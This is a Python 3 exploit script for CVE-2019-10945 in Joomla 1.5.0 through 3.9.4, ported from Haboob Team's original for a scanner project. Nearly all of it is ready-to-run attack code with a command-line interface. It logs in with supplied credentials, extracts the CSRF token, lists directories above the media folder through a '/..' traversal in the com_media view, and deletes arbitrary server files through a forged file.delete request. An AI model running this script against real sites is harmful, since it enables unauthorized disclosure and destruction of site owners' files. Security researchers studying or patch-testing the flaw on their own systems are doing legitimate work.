#!/usr/bin/env python3
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Date: 2019-March-13
# Exploit Author: Haboob Team
# Ported to Python 3 by: arya_pokharel for Joomla Scanner project
# Web Site: haboob.sa
# Email: research@haboob.sa
# Software Link: https://www.joomla.org/
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# CVE : CVE-2019-10945
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945

import re
import tempfile
import pickle
import os
import hashlib
import urllib.parse
import sys

try:
    import click
except ImportError:
    print("module 'click' doesn't exist, type: pip install click")
    sys.exit(0)

try:
    import requests
except ImportError:
    print("module 'requests' doesn't exist, type: pip install requests")
    sys.exit(0)

try:
    import lxml.html
except ImportError:
    print("module 'lxml' doesn't exist, type: pip install lxml")
    sys.exit(0)

mediaList = "?option=com_media&view=mediaList&tmpl=component&folder=/.."

BANNER = r'''
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# CVE : CVE-2019-10945
 _    _          ____   ____   ____  ____ 
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ <
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/
'''

print(BANNER)

class URL(click.ParamType):
    name = 'url'
    regex = re.compile(
        r'^(?:http)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    def convert(self, value, param, ctx):
        if not isinstance(value, tuple):
            if re.match(self.regex, value) is None:
                self.fail('invalid URL (%s)' % value, param, ctx)
        return value


def getForm(url, query, cookie=None):
    if cookie is None:
        cookie = {}
    
    # Check if cookie is a dict or cookiejar
    cookies_to_use = cookie
    if hasattr(cookie, 'get_dict'):
        cookies_to_use = cookie.get_dict()

    r = requests.get(url, cookies=cookies_to_use, timeout=10)
    if r.status_code != 200:
        print(f"[-] invalid URL or check failed: {r.status_code}")
        # Don't exit, just return empty
        return [], r.cookies
        
    # lxml needs bytes or unicode. requests.text is unicode.
    html = lxml.html.fromstring(r.text)
    return html.xpath(query), r.cookies


def login(url, username, password):
    print(f"[*] Attempting login as {username}...")
    # CSRF extraction
    csrf_tokens, cookie = getForm(url, '//input[@type="hidden"]/@name')
    
    # Filter for standard token (32 chars usually) or just grab last one
    # The original script grabbed `//input/@name` and took the last one used as key.
    # We will try to find the CSRF token.
    csrf_token = None
    
    # Original logic: csrf[-1]
    if not csrf_tokens:
        print("[-] Could not find any hidden inputs for CSRF token.")
        sys.exit(1)
        
    # Heuristic: Joomla CSRF tokens are often the last hidden field with value '1'
    # But for safety we'll stick to original script's logic: grab ALL names and use the last one?
    # Original: csrf, cookie = getForm(url, '//input/@name') ... postData = { ... csrf[-1]: 1}
    # This implies the CSRF token is the last input field.
    
    csrf_token = csrf_tokens[-1]
    
    postData = {
        'username': username, 
        'passwd': password, 
        'option': 'com_login', 
        'task': 'login',
        'return': 'aW5kZXgucGhw', 
        csrf_token: '1'
    }

    # Convert cookiejar to dict for requests
    res = requests.post(url, cookies=cookie.get_dict(), data=postData, allow_redirects=True)
    
    # Login verification
    # Original script checked for 'alert-message' to print error.
    html = lxml.html.fromstring(res.text)
    error_msg = html.xpath("//div[contains(@class, 'alert-message')]/text()")
    
    # If we see obvious error text
    if error_msg:
        # Check if it is a real error (like "match") or just a warning (like "PHP version")
        text = "".join(error_msg).lower()
        if "match" in text or "invalid" in text:
            print(f"[-] Login Failed: {text.strip()}")
            sys.exit(1)
        else:
            print(f"[!] Warning found but proceeding: {text.strip()}")

    # Save logic
    print("[+] Login successful (or no error detected). Saving cookies.")
    get_cookies(res.cookies, url, username, password)


def save_cookies(requests_cookiejar, filename):
    with open(filename, 'wb') as f:
        pickle.dump(requests_cookiejar, f)


def load_cookies(filename):
    with open(filename, 'rb') as f:
        return pickle.load(f)


def cookies_file_name(url, username, password):
    # Python 3 requires bytes for hashlib
    raw = (str(url) + str(username) + str(password)).encode('utf-8')
    result = hashlib.md5(raw)
    _dir = tempfile.gettempdir()
    return os.path.join(_dir, result.hexdigest() + ".Jcookie")


def get_cookies(req_cookie, url, username, password):
    cookie_file = cookies_file_name(url, username, password)
    
    # If we are passed new cookies (req_cookie), save them
    if req_cookie:
        save_cookies(req_cookie, cookie_file)
        return req_cookie
        
    if os.path.isfile(cookie_file):
        print(f"[*] Loading session from {cookie_file}")
        return load_cookies(cookie_file)
    else:
        # No cookies yet, just return what we have
        return req_cookie


def traversal(url, username, password, directory=None):
    cookie = get_cookies(None, url, username, password)
    if not cookie:
        print("[-] No session cookie found. Logging in...")
        login(url, username, password)
        cookie = get_cookies(None, url, username, password)

    target_url = url + mediaList + (directory if directory else "")
    print(f"[*] Listing directory: {target_url}")
    
    # getForm returns xpath result. For values:
    files, _ = getForm(target_url, "//input[@name='rm[]']/@value", cookie)
    
    if not files:
        print("[-] No files found or access denied.")
    else:
        print(f"[+] Found {len(files)} files/dirs:")
        for file in files:
            print(f"  - {file}")


def removeFile(baseurl, username, password, directory='', filename=''):
    cookie = get_cookies(None, baseurl, username, password)
    if not cookie:
        login(baseurl, username, password)
        cookie = get_cookies(None, baseurl, username, password)

    url = baseurl + mediaList + directory
    print(f"[*] Getting delete token from: {url}")
    
    # Found link logic in original script: //a[@target='_top']/@href
    # This presumably finds the 'delete' button/link to extract tokens?
    links, _ = getForm(url, "//a[@target='_top']/@href", cookie)
    
    if links:
        # Original: unquote(link[0]) ...
        link = urllib.parse.unquote(links[0])
        
        # Construct delete URL
        # The original script replaces 'folder.delete' with 'file.delete' ?
        # And appends rm[]=filename
        if 'folder=' in link:
            base_link = link.split('folder=')[0]
            # Heuristic replacement based on original script
            final_link = base_link.replace("folder.delete", "file.delete")
            final_link += "folder=/.." + directory + "&rm[]=" + filename
            
            # Prepend baseurl if link is relative
            if not final_link.startswith("http"):
                # Usually regex in URL type ensures trailing slash, but just in case
                final_link = baseurl.rstrip('/') + '/' + final_link.lstrip('/')
                
            print(f"[*] Sending delete request: {final_link}")
            
            # Send the delete request
            msg, _ = getForm(final_link, "//div[contains(@class,'alert-message')]/text()", cookie)
            
            if not msg:
                print("[-] No confirmation message. File might not exist or verify manually.")
            else:
                print(f"[+] Server Response: {' '.join(msg).strip()}")
    else:
        print("[-] Could not find delete link/token on page. Are you admin?")


@click.group(invoke_without_command=True)
@click.option('--url', type=URL(), help="Joomla Administrator URL", required=True)
@click.option('--username', type=str, help="Joomla Manager username", required=True)
@click.option('--password', type=str, help="Joomla Manager password", required=True)
@click.option('--dir', type=str, help="Listing directory (e.g. /images)")
@click.option('--rm', type=str, help="Delete file name (e.g. shell.php)")
@click.pass_context
def cli(ctx, url, username, password, dir, rm):
    # Ensure URL ends with / and has administrator
    if not url.endswith("/"):
        url += "/"
        
    # Original script expects user to pass full admin URL?
    # "python exploit.py --url=http://example.com/administrator"
    # Yes.
    
    cookie_file = cookies_file_name(url, username, password)
    if not os.path.isfile(cookie_file):
        login(url, username, password)
        
    # specific directory logic
    if dir is not None:
        # cleanup slashes
        dir = "/" + dir.strip('/')
        if dir in ["/", "/.", "/.."]:
            dir = ""
    else:
        dir = ""
        
    if rm is not None:
        removeFile(url, username, password, dir, rm)
    else:
        traversal(url, username, password, dir)


if __name__ == '__main__':
    cli()
